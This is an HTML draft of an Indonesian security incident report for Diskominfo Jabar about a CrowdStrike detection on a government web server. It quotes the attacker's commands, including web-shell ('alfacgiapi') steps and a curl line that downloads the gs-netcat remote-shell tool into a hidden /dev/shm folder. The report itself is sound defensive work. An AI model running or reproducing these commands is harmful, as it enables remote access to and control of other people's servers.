@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <link rel="stylesheet" href="stylecss.css">
+    <tittle>SOC Elitery Report - Diskominfo Jabar</tittle>
+    </head>
+<body>
+    <h1>CrowdStrike finding on host kmob.jabarprov.go.id - Malicious Activity Detected</h1>
+    <h2>Draft:</h2>
+
+<!--ini buat buat bagian body-->
+    <p>
+        Dear Tim Diskominfo Jabar,
+    <br>>
+Tim IT Security ingin menginformasikan terkait temuan pada <b>CrowdStrike Endpoint Detection</b> dengan severity High pada host kmob.jabarprov.go.id yaitu terdapat temuan Execution via Exploitation for Client Execution. Temuan ini ingin menginformasikan bahwa terdapat command berbahaya yang dieksekusi pada host yang dilakukan oleh Threat Actor dimana command ini bertujuan untuk mencoba untuk melakukan koneksi remote dengan web server dan melakukan eksploitasi pada host tersebut.
+    </p>
+    <p>
+Berikut beberapa command yang terdeteksi dilakukan oleh Threat Actor:
+    <br>
+-sh -c which bzialfa2
+    <br>
+-sh -c cd '/tmp/alfacgiapi';sh getheader.alfa
+    <br>
+-curl -fsSL --connect-timeout 7 -m30 --retry 3 https://gsocket[.]io/bin/gs-netcat_x86_64-alpine[.]tar[.]gz --output /dev/shm/.defaults/gs-netcat_x86_64-alpine.tar.gz
+    <br>
+-[php-fpm]
+    <br>
+-/database/1975/197501192008011002/memek/inc/defaults -g
+    <br>
+Sebagai informasi tambahan, adapun action dari temuan ini telah dilakukan Process killed dan Quarantined oleh CrowdStrike Endpoint Detection.
+<b>Server Terdampak:</b>
+    <br>
+kmob.jabarprov.go.id
+<b>Timestamp:</b>
+    <br>
+23 May 2024 22:05:34 PM
+<b>Resiko:</b>
+    <br>
+-Unauthorized Access
+    <br>
+-Remote Command Execution
+    <br>
+-Malware Infection
+    <br>
+-Command and Control
+<b>Rekomendasi:</b>
+    <br>
+-Melakukan pencarian dan penghapusan malicious file yang terdeteksi pada Crowdstrike.
+    <br>
+-Melakukan vulnerability scanning pada server secara berkala.
+    <br>
+-Menerapkan prinsip hak istimewa yang paling sedikit dengan membatasi hak istimewa akun pengguna sehingga hanya akun yang diotorisasi yang dapat memodifikasi direktori web atau melakukan eksekusi command pada web server.
+<b>Referensi:</b>
+    <br>
+<a href="https://attack.mitre.org/techniques/T1505/003/" target="_blank">- ATT&CK - Server Software Component: Web Shell </a>
+    <br>
+<a href="https://attack.mitre.org/techniques/T1059/" target="_blank">- ATT&CK - Command and Scripting Interpreter </a>
+    <br>
+    
+</p>
+
+<h2> Terima kasih. </h2>
+
+<h2> Evicences:</h2>
+<p> 1. Temuan pada CrowdStrike endpoint detections.</p>
+<img src="Deteksi.png">
+<p> 2. Aktivitas command yang terdeteksi Crowdstrike.</p>
+<img src="command 1.png">
+<p> 3. Aktivitas command yang terdeteksi Crowdstrike.</p>
+<img src="command 2.png">
+<p> 4. Aktivitas command yang terdeteksi Crowdstrike.</p>
+<img src="command 3.png">
+<p> 5. Aktivitas command yang terdeteksi Crowdstrike.</p>
+<img src="command 4.png">
+<p> 5. Aktivitas command yang terdeteksi Crowdstrike.</p>
+<img src="command 5.png">
+</body>
+</html>
